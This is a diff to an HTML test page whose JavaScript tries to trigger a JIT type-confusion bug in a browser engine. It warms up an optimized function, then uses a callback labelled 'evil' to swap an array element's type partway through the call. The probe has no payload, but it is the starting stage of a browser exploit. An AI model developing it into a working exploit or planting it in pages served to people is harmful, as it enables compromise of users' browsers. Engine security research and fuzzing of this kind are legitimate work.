@@ -1,21 +1,33 @@
 <!DOCTYPE html>
 <script>
-  function triggerJITBug() {
-    let arr = [1.1, 2.2, 3.3];  
-    let tmp = {};
+  function triggerGhostArray() {
+    // Step 1: Create a floating-point array
+    let arr = [1.1, 2.2, 3.3, 4.4];
+    
+    // Step 2: Force JIT optimization
+    function confuse(x, callback) {
+      let v = x[0];  // JIT assumes 'x' is always Float64
+      callback();     // Side effect: Swap array type
+      return v + x[1]; // Potential type confusion
+    }
 
-    // Force JIT compilation by repeating
+    // Step 3: Callback swaps 'arr' to an object array
+    function evil() {
+      arr[0] = {};   // Corrupt type assumption
+    }
+
+    // Step 4: Warm up JIT
     for (let i = 0; i < 100000; i++) {
-      arr[i] = {};  // Potential type confusion?
-      tmp.x = arr[i];
+      confuse(arr, () => {});
     }
 
-    // Check for unexpected behavior
-    if (typeof arr[0] !== 'number') {
-      console.log("[!] JIT Type Confusion Detected");
-    } else {
-      console.log("[✓] No JIT Bug Found");
-    }
+    // Step 5: Trigger confusion
+    let result = confuse(arr, evil);
+    console.log("[!] Result:", result); // Check for NaN/crash
+    return result;
   }
-  triggerJITBug();
+
+  // Run test
+  let res = triggerGhostArray();
+  document.write("Test completed. Result: " + res);
 </script>
